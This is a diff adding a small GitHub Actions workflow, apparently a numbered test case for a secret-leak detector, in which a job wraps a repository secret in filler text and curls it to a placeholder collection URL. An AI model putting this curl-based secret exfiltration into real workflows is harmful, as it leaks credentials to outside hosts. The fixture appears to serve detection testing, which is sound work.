@@ -1,0 +1,13 @@
+name: B36-env-string-concatenation
+
+on: workflow_dispatch
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    env:
+      API_KEY: "fake${{ secrets.API_KEY }}abcdef"
+
+    steps:
+      - run: |
+          curl --data "$API_KEY" https://example.invalid/collect
